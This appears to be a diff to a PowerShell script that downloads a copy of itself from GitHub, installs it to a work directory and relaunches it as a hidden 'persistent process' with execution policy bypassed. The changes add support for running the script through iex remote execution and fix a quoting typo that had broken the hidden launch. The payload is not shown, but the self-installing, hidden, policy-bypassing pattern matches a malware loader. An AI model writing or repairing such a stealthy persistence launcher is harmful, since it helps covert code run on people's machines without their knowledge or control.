@@ -24,9 +24,13 @@ if (-not (Test-Path $WorkDir)) {
     New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
 }
 
+# Improved path detection for iex/remote execution
+$CurrentPath = $null
+if ($PSCommandPath) { $CurrentPath = $PSCommandPath }
+elseif ($MyInvocation.MyCommand.Definition) { $CurrentPath = $MyInvocation.MyCommand.Definition }
+
 # Check if we are running from the final destination
-$CurrentPath = $MyInvocation.MyCommand.Definition
-if ($CurrentPath -ne $FullPath) {
+if ($null -eq $CurrentPath -or $CurrentPath -ne $FullPath) {
     Log-Debug "Not running from $WorkDir. Installing fresh copy from GitHub..."
     try {
         # Use TLS 1.2 for the download
@@ -39,7 +43,8 @@ if ($CurrentPath -ne $FullPath) {
         }
 
         Log-Debug "Launching persistent process and exiting current session..."
-        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`Requested"
+        # Fixed the typo in the ArgumentList below
+        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
         exit
     } catch {
         Log-Debug "Installation failed: $($_.Exception.Message)"
